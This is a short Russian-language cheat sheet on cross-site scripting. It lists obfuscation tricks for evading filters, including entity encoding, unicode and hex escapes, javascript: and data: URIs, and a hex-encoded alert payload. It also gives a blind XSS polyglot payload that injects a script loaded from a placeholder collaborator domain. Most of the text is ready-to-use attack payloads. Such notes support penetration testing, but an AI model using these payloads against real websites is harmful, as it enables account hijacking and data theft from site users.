## Обфускация

- против регулярок - переносы строк, смена регистра
- внутри HTML-атрибутов и SVG-тегов можно использовать XML/HTML entity encoding
- названия функций можно кодировать в UTF  `\u00 + 'Щ'.charCodeAt(0).String(16)`
- в атрибуте `href` можно использовать псевдопротокол `javascript:`
- в атрибуте `src` как `data:javascript,alert(1)`
- в функцию можно передать hex-энкод:

```js
setTimeout`\x61\x6c\x65\x72\x74\x28\x31\x29\` 
```

## Blind XSS

```
</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/yourcollaboratordomain/).slice(2), document.documentElement.appendChild(s))//'>
```